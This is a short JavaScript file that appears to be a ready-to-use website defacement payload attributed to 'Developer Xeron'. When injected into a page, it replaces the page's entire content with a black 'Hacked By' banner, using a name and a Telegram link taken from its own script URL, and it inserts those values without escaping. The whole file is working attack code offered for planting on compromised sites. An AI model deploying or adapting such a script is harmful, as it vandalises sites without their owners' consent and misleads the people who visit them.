// Code by Developer Xeron

(function () {

  function getParams() {
    const script = document.currentScript;
    const url = new URL(script.src);

    return {
      name: url.searchParams.get("name") || "Xeron",
      message: url.searchParams.get("message") || "https://t.me/CodeDevZeron"
    };
  }

  function run() {

    const { name, message } = getParams();

    document.body.innerHTML = `
<!DOCTYPE html>
<html>
<head>
<title>Hacked By ${name}</title>
<style>
body {
  background: black;
  color: #00ffcc;
  text-align:center;
  font-family: monospace;
  margin-top: 50px;
}
a { color:#00ffcc; }
</style>
</head>

<body>

<h1>Hacked By ${name}</h1>
<h2><a href="${message}" target="_blank">${message}</a></h2>

</body>
</html>
    `;
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", run);
  } else run();

})();
